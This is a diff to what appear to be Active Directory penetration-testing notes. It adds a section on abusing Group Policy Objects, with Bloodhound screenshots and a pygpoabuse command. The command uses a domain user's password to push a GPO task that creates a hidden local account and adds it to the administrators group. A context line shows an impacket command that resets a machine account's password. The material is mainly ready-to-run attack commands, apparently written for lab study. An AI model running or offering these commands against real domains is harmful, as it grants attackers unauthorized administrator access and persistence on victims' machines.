@@ -606,11 +606,27 @@ impacket-changepasswd ignite.local/DEMO$@192.168.1.48 -newpass 'Password@987' -p
 
 -----------------
 
-###
+### Exploiting Group Policy Objects
 
 -------------------
 
-- 
+- Bloodhound
+
+<img width="1279" height="671" alt="image" src="https://github.com/user-attachments/assets/c62a81e6-1c38-4b3e-a08d-b28c9a95a1c8" />
+
+- Exploiting with `pygpoabuse`-:
+
+```bash
+pygpoabuse 'papa.local/dev:password' -gpo-id 'AD57560C-6272-4088-892B-C0A7D6D874D9' -command 'net user secret Password123! /add && net localgroup administrators secret /add' -v
+```
+
+<img width="1886" height="142" alt="image" src="https://github.com/user-attachments/assets/89542522-91a9-4bad-973e-e2d2993e1548" />
+
+- Proof of creation-:
+
+<img width="1753" height="245" alt="image" src="https://github.com/user-attachments/assets/2545aeb5-4e14-45c1-bb18-c6362229fa99" />
+
+
 
 ----------------
 
